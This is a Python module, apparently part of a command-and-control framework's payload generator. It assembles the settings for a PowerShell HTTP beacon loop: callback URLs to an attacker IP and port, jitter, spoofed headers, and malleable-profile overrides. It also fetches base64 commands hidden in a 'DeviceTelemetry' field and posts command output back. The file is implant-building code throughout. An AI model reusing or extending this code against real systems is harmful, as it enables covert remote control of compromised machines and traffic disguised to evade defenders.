from typing import NamedTuple, Union, Dict
import textwrap

from core.malleable_c2.profile_loader import (
    load_profile, ProfileConfig,
    _render_ps_mapping, _render_ps_output
)
from core.payload_generator.common import payload_utils as payutils

class PsHttpContext(NamedTuple):
    beacon_url: str
    beacon_post_url: str
    effective_ua: str
    beacon_interval: int
    beacon_jitter: int
    grab_output: str
    send_output: str
    formatted_headers: str
    accept_header: str
    host_header: str
    range_header: str

def build_ps_http_context(
    ip: str,
    port: int,
    *,
    transport: str = "http",
    headers: Dict[str,str],
    useragent: str,
    accept: str,
    byte_range: int,
    interval: int,
    jitter: int,
    profile: Union[str, ProfileConfig, None] = None
) -> PsHttpContext:
    """
    Returns all of the variables you need to render a PS HTTP/HTTPS payload loop.
    """
    beacon_og = f"{transport}://{ip}:{port}"
    if profile:
        cfg: ProfileConfig = load_profile(
            profile_path    = profile,
            default_headers = headers or {},
            default_ua      = useragent,
            port            = port,
            transport       = transport,
        )
        # override timing
        interval = cfg.interval or interval
        jitter   = cfg.jitter   or jitter

        # build URLs
        beacon_url      = beacon_og.rstrip("/") + cfg.get_uri
        beacon_post_url = beacon_og.rstrip("/") + cfg.post_uri

        # UA + headers
        effective_ua = cfg.useragent or useragent
        for k in ("Accept","Host","Range"):
            cfg.client_headers.pop(k, None)
        grab_output    = _render_ps_mapping(cfg.output_mapping)
        send_output    = _render_ps_output(cfg.post_client_mapping)
        headers_block  = payutils.build_powershell_headers(
            cfg.client_headers, nostart=True, first=True
        )

        accept_hdr = f"$req.Accept = '{cfg.accept}';"  if cfg.accept  else ""
        host_hdr   = f"$req.Host   = '{cfg.host}';"    if cfg.host    else ""
        range_hdr  = f"$req.AddRange(0, {cfg.byte_range});" if cfg.byte_range else ""
    else:
        beacon_url      = beacon_og
        beacon_post_url = beacon_og
        effective_ua    = useragent

        grab_output   = textwrap.dedent("""\
            if ($task.DeviceTelemetry) {
                $cmd_b64 = $task.DeviceTelemetry.Telemetry;

        """).replace("\n","")
        send_output   = "$body = @{ output = $b64 } | ConvertTo-Json;"
        headers_block = payutils.build_powershell_headers(
            headers or {}, nostart=True, first=True
        )

        accept_hdr = f"$req.Accept = '{accept}';" if accept else ""
        host_hdr   = f"$req.Host   = '{headers.get('Host')}';" \
                     if headers and "Host" in headers else ""
        range_hdr  = f"$req.AddRange(0, {byte_range});" if byte_range else ""

    return PsHttpContext(
        beacon_url      = beacon_url,
        beacon_post_url = beacon_post_url,
        effective_ua    = effective_ua,
        beacon_interval = interval,
        beacon_jitter   = jitter,
        grab_output     = grab_output,
        send_output     = send_output,
        formatted_headers = headers_block,
        accept_header   = accept_hdr,
        host_header     = host_hdr,
        range_header    = range_hdr,
    )